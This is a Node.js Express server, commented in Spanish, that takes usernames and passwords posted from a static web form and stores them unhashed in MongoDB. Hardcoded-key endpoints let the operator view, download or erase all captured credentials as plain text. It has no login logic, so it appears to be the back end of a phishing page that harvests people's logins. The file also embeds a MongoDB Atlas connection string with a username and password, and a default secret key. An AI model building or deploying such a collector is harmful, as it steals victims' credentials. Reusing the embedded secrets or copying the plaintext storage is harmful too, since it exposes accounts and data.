const express = require('express');
const { MongoClient } = require('mongodb');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// ========== CONFIGURACIÓN ==========
const SECRET_KEY = process.env.SECRET_KEY || 'mi-clave-secreta-123';
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://serviciostipt_db_user:TdPB66SvfW2XdeeN@cluster0.b73zjbz.mongodb.net/';
const DB_NAME = process.env.DB_NAME || 'formulario_db';
const COLLECTION_NAME = 'submissions';

let collection;

// ========== CONEXIÓN A MONGODB ==========
async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  const db = client.db(DB_NAME);
  collection = db.collection(COLLECTION_NAME);
  console.log('✅ Conectado a MongoDB Atlas');
}

// ========== API: GUARDAR REGISTRO ==========
app.post('/api/submit', async (req, res) => {
  try {
    const { usuario, password } = req.body;
    
    const doc = {
      usuario: usuario || '(vacío)',
      password: password || '(vacío)',
      fecha: new Date()
    };
    
    await collection.insertOne(doc);
    res.json({ success: true, message: 'Registro guardado correctamente' });
  } catch (err) {
    console.error('Error al guardar:', err);
    res.status(500).json({ success: false, error: 'Error al guardar en la base de datos' });
  }
});

// ========== VER REGISTROS EN TEXTO PLANO ==========
app.get('/submissions.txt', async (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_KEY) {
    return res.status(403).send('⛔ ACCESO DENEGADO\n\nSe requiere una clave válida.\nEjemplo: /submissions.txt?key=TU_CLAVE');
  }
  
  try {
    const docs = await collection.find({}).sort({ fecha: 1 }).toArray();
    
    if (docs.length === 0) {
      return res.status(404).send('No hay registros aún.');
    }
    
    let content = '=== REGISTROS DEL FORMULARIO ===\n';
    content += `Generado: ${new Date().toLocaleString('es-ES')}\n`;
    content += `Total: ${docs.length}\n================================\n\n`;
    
    docs.forEach((doc, index) => {
      const fecha = doc.fecha ? new Date(doc.fecha).toLocaleString('es-ES') : 'Sin fecha';
      content += `Registro #${index + 1}\n`;
      content += `  Usuario:  ${doc.usuario}\n`;
      content += `  Password: ${doc.password}\n`;
      content += `  Fecha:    ${fecha}\n`;
      content += '--------------------------------\n';
    });
    
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(content);
  } catch (err) {
    console.error('Error al leer:', err);
    res.status(500).send('Error al leer la base de datos');
  }
});

// ========== DESCARGAR ARCHIVO .txt ==========
app.get('/api/download', async (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_KEY) {
    return res.status(403).json({ error: 'Clave incorrecta' });
  }
  
  try {
    const docs = await collection.find({}).sort({ fecha: 1 }).toArray();
    
    let content = '=== REGISTROS DEL FORMULARIO ===\n';
    content += `Generado: ${new Date().toLocaleString('es-ES')}\n`;
    content += `Total: ${docs.length}\n================================\n\n`;
    
    docs.forEach((doc, index) => {
      const fecha = doc.fecha ? new Date(doc.fecha).toLocaleString('es-ES') : 'Sin fecha';
      content += `Registro #${index + 1}\n`;
      content += `  Usuario:  ${doc.usuario}\n`;
      content += `  Password: ${doc.password}\n`;
      content += `  Fecha:    ${fecha}\n`;
      content += '--------------------------------\n';
    });
    
    res.setHeader('Content-Disposition', 'attachment; filename="todos_los_registros.txt"');
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(content);
  } catch (err) {
    console.error('Error al descargar:', err);
    res.status(500).json({ error: 'Error al generar el archivo' });
  }
});

// ========== LIMPIAR / REINICIAR REGISTROS ==========
app.get('/api/clear', async (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_KEY) {
    return res.status(403).send('⛔ ACCESO DENEGADO. Clave incorrecta.');
  }
  
  try {
    const result = await collection.deleteMany({});
    res.json({ 
      success: true, 
      message: 'Registros limpiados correctamente',
      eliminados: result.deletedCount 
    });
  } catch (err) {
    console.error('Error al limpiar:', err);
    res.status(500).json({ success: false, error: 'Error al limpiar la base de datos' });
  }
});

// ========== INICIAR SERVIDOR ==========
const PORT = process.env.PORT || 3000;

connectDB().then(() => {
  app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
  });
}).catch(err => {
  console.error('❌ Error al conectar a MongoDB:', err);
  process.exit(1);
});